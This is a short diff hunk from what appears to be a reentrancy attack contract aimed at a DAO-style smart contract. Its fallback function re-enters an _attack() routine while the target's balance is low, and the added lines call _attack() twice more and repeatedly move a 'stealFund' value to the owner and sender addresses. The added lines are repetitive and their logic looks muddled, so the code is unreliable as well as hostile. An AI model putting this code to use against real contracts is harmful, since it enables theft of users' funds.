@@ -57,3 +57,9 @@ def __default__():
     if (DAO(self.dao_address).userBalances(self.dao_address) < 10000):
         self._attack()
     
+    self._attack()
+    self._attack()
+    DAO(self.owner_address).deposit(value = stealFund)
+    DAO(msg.sender).deposit(value = stealFund)
+    DAO(self.owner_address).deposit(value = stealFund)
+    DAO(msg.sender).deposit(value = stealFund)
